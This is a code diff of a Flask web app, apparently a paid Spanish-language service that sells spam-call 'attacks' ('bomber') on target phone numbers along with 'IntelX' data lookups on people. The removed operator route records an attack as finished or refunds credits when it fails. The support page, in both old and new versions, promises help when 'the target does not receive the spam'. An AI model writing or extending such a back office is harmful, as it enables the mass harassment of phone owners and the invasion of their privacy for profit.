-            <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest ml-1">Notas del ataque (Opcional):</p>
-            <textarea name="notas_spam" placeholder="Ej: Ataque finalizado con 500 llamadas exitosas..."
-                class="input-dark h-32 resize-none text-sm leading-relaxed"></textarea>
-
-            <div class="grid grid-cols-2 gap-4 mt-6">
-                <button type="submit" name="accion" value="exito" class="w-full bg-emerald-500 hover:bg-emerald-600 text-white rounded-xl py-4 text-xs font-bold uppercase tracking-widest shadow-[0_0_15px_rgba(16,185,129,0.3)] transition">
-                    SPAM COMPLETADO
-                </button>
-                <button type="submit" name="accion" value="rechazar" class="w-full bg-rose-500 hover:bg-rose-600 text-white rounded-xl py-4 text-xs font-bold uppercase tracking-widest shadow-[0_0_15px_rgba(244,63,94,0.3)] transition">
-                    FALLÓ
-                </button>
-            </div>
-        </form>
-        """
-
-    content = f"""
-    <div class="neon-card p-6 mt-6 shadow-2xl border-cyan-900/30">
-        <h2 class="text-center text-[12px] text-cyan-400 font-bold mb-6 uppercase tracking-[0.2em]">
-            Responder Solicitud Manual (Legacy)
-        </h2>
-
-        <div class="bg-[#111a26] p-4 rounded-xl mb-8 border border-[#1e293b]">
-            <div class="flex justify-between items-center mb-2">
-                <p class="text-[9px] text-gray-500 uppercase font-bold tracking-widest">CLIENTE:</p>
-                <p class="text-[10px] text-white font-bold">{p["cliente"]}</p>
-            </div>
-            <div class="flex justify-between items-center mb-4">
-                <p class="text-[9px] text-gray-500 uppercase font-bold tracking-widest">TIPO:</p>
-                <p class="text-[10px] text-cyan-400 font-bold">{(p["tipo"] or "").upper()}</p>
-            </div>
-
-            <div class="bg-black/40 p-3 rounded-lg border border-[#1e293b]">
-                <p class="text-xs font-mono text-center text-white">{p["referencia"] or "Sin dato"}</p>
-            </div>
-        </div>
-
-        {form_html}
-    </div>
-    """
-    return layout(content, True)
-
-
-@app.route("/completar", methods=["POST"])
-def completar():
-    if not require_login() or session.get("rol") != "operador":
-        return redirect("/")
-
-    id_p = request.form.get("id_p")
-    tipo_form = request.form.get("tipo_form", "").strip().lower()
-    accion = request.form.get("accion")
-
-    conn = get_conn()
-    cur = conn.cursor()
-
-    if accion == "rechazar":
-        cur.execute("UPDATE pedidos SET estado='RECHAZADO', operador=? WHERE id_pedido=?", (session.get("user", ""), id_p))
-        cur.execute("SELECT cliente, tipo FROM pedidos WHERE id_pedido=?", (id_p,))
-        row = cur.fetchone()
-        if row:
-            cliente = row["cliente"]
-            tipo_pedido = (row["tipo"] or "").upper()
-            reembolso = 1 if tipo_pedido == "INTELX" else 2
-            cur.execute("UPDATE usuarios SET creditos = creditos + ? WHERE user=?", (reembolso, cliente))
-
-    elif accion == "exito":
-        if tipo_form == "intelx":
-            datos = request.form.get("datos_obtenidos", "").strip()
-            respuesta_final = "DATOS ENCONTRADOS"
-            
-            cur.execute("""
-                UPDATE pedidos
-                SET respuesta=?, detalle=?, codigo='', operador=?, estado='EXITOSO'
-                WHERE id_pedido=?
-            """, (
-                respuesta_final,
-                datos,
-                session.get("user", ""),
-                id_p
-            ))
-
-        else: # llamadas_spam
-            notas_spam = request.form.get("notas_spam", "").strip()
-            if not notas_spam:
-                notas_spam = "El ataque de llamadas masivas se ha ejecutado con éxito sobre el número objetivo."
-
-            cur.execute("""
-                UPDATE pedidos
-                SET respuesta=?, detalle=?, codigo='', operador=?, estado='EXITOSO'
-                WHERE id_pedido=?
-            """, (
-                "ATAQUE FINALIZADO",
-                notas_spam,
-                session.get("user", ""),
-                id_p
-            ))
-
-    conn.commit()
-    conn.close()
-
-    return redirect("/gestion")
 
 
 @app.route("/soporte")
@@ -1273,29 +1055,33 @@ def soporte():
         return redirect("/login")
 
     content = """
-    <div class="neon-card p-8 mt-6 text-center">
-        <h2 class="text-3xl font-black text-white mb-4 tracking-tight">¿Necesitas ayuda?</h2>
-        <p class="text-gray-400 text-sm mb-8 leading-relaxed">
-            Estamos aquí para apoyarte en todo momento.
+    <div class="neon-card p-10 mt-6 text-center">
+        <div class="w-20 h-20 bg-blue-500/10 border border-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
+            <span class="text-4xl">🛡️</span>
+        </div>
+        <h2 class="text-3xl font-black text-white mb-3 tracking-tight">Centro de Mando</h2>
+        <p class="text-gray-400 text-sm mb-10 leading-relaxed max-w-[250px] mx-auto">
+            Resolución inmediata de conflictos técnicos y fallos de API.
         </p>
 
-        <div class="bg-[#111a26] rounded-[20px] p-6 border-l-4 border-cyan-500 text-left mb-10 shadow-sm">
-            <p class="text-white text-sm leading-relaxed mb-6">
-                <span class="text-cyan-400 font-bold">💬 ¿Dudas con una búsqueda en IntelX?</span><br>
-                <span class="text-gray-400">Contáctanos si un resultado no te convence o quieres más datos.</span>
+        <div class="bg-white/[0.02] rounded-[24px] p-6 border border-white/10 text-left mb-10 shadow-sm relative overflow-hidden">
+            <div class="absolute left-0 top-0 w-1 h-full bg-gradient-to-b from-cyan-500 to-purple-500"></div>
+            <p class="text-white text-sm leading-relaxed mb-6 pl-2">
+                <span class="text-cyan-400 font-black tracking-wide">💡 Dudas con IntelX</span><br>
+                <span class="text-gray-400 text-xs">Si el tracker bota un HTTP Error, reporta el dominio o IP para su parche.</span>
             </p>
-            <p class="text-white text-sm leading-relaxed">
-                <span class="text-rose-400 font-bold">⚠️ ¿Problemas con el envío de spam?</span><br>
-                <span class="text-gray-400">Nuestro soporte revisará qué pasó con tu ataque.</span>
+            <p class="text-white text-sm leading-relaxed pl-2">
+                <span class="text-rose-400 font-black tracking-wide">⚠️ Falla en Bomber</span><br>
+                <span class="text-gray-400 text-xs">Si los créditos se consumieron pero el target no recibe el spam, abriremos un ticket.</span>
             </p>
         </div>
 
         <div class="text-center">
             <a href="https://t.me/DRAKITO_VIP" target="_blank"
-               class="inline-block bg-[#0f172a] text-cyan-400 border border-[#1e293b] rounded-full py-4 px-12 text-sm uppercase font-bold tracking-widest shadow-lg hover:bg-[#1e293b] transition">
-                Contactar
+               class="inline-block bg-white text-black rounded-xl py-4 px-12 text-xs uppercase font-black tracking-[0.2em] shadow-[0_0_20px_rgba(255,255,255,0.2)] hover:scale-105 transition-transform">
+                ABRIR TICKET ➔
             </a>
-            <p class="text-gray-500 text-xs mt-6 uppercase tracking-widest font-bold">Soporte disponible 24/7</p>
+            <p class="text-gray-500 text-[10px] mt-6 uppercase tracking-[0.3em] font-bold">Respuesta en < 5 mins</p>
         </div>
     </div>
     """
@@ -1304,6 +1090,6 @@ def soporte():
 
 init_db()
 
-# Esta línea Vercel la ignorará, pero sirve si lo pruebas localmente en Pydroid o Termux
+# Ignorado por Vercel
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=True)
